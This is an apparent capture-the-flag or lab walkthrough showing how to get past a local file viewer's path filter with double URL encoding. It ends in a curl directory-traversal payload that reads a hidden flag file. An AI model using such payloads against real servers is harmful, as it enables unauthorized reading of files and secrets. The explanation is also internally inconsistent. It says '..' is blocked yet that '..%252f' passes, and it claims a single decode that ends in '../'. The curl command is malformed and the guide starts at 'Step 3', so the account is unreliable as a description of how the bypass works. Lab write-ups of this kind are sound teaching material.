# Bypassing File Path Filters Using Double Encoding

This guide explains how to bypass simple input sanitization in a file viewer web application running at:

http://localhost:5000


The application blocks basic directory traversal patterns, including:

- `..`
- `/`
- `flag`
- `etc`

Because of this, normal traversal payloads such as:

../secret/very/hidden/flag.txt


will **not** work.

---

## 🚩 Step 3 — Double-Encoded Bypass

The key discovery is:

> ❗ The server sanitizes user input **before decoding**, and only decodes **once**.

This means we can bypass the filter by **double URL encoding** characters such as `/`.

---

## 🔑 Encoding Breakdown

| Meaning | Representation |
|--------|----------------|
| Normal `/` | `/` |
| URL encoded once | `%2f` |
| URL encoded *twice* | `%252f` |

Since the server sanitizes the *encoded* string, `..%252f` passes the filter.  
After one decode step, it becomes `..%2f`, which then resolves to `../` internally.

---

## 🧪 Exploit Payload (Double Encoded)

Use cURL to request the hidden file:

curl "http://localhost:5000/view?file=..%252fsecret%252fvery%252fhidden%252fflag.txt

If the application is vulnerable, it will return the contents of:

secret/very/hidden/flag.txt

http://localhost:5000
